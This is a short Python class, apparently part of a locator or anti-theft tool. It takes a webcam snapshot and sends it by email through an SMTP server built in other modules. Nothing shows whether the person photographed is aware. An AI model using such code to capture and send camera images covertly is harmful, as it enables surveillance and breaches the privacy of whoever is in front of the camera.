from ..controller.mailController import *
from ..controller.function import camshot, initMedia, closeMedia


class g30loc():
    def getCamShot(self):
        camshot()

    def __send(self):
        server = ServerSMTP()
        mail = Mail()
        server.send(mail)

    def start(self):
        initMedia()
        self.getCamShot()
        self.__send()
        closeMedia()
